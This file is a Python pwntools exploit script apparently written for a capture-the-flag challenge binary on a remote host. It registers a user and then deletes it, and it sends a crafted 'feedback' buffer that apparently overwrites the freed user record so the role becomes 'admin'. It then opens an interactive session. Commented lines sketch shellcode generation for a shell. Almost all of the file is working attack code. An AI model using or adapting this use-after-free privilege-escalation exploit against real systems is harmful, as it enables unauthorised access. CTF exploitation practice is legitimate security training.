#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '13.212.234.124'
port = int(args.PORT or 11103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break feedback
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def register_user(username, password):
    io.sendline(b"2")
    io.sendlineafter(
        b"Enter your username: ",
        username
    )
    io.sendlineafter(
        b"Enter your password: ",
        password
    )
    io.clean()

def delete_user(username, password):
    io.sendline(b"3")
    io.sendlineafter(
        b"Enter the username of the user to delete: ",
        username
    )
    io.sendlineafter(
        b"Enter the password of the user to delete: ",
        password
    )
    io.clean()

def send_feedback(username, password, role):
    io.sendline(b"4")
    io.sendlineafter(
        b"Enter the length of feedback: ",
        b"140"
    )
    io.sendlineafter(
        b"Enter your feedback (up to 140 characters): ",
        username + b"\x00" + b"A" * (50 - 1 - len(username)) +
        password + b"\x00" + b"A" * (50 - 1 - len(password)) +
        role + b"\x00" + b"A" * (30 - 1 - len(role))
    )

if __name__ == "__main__":
    USERNAME = b"not_admin_yet_un"
    PASSWORD = b"not_admin_yet_pw"

    register_user(USERNAME, PASSWORD)
    delete_user(USERNAME, PASSWORD)
    send_feedback(USERNAME, PASSWORD, b"admin")

    io.interactive()

io.close()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


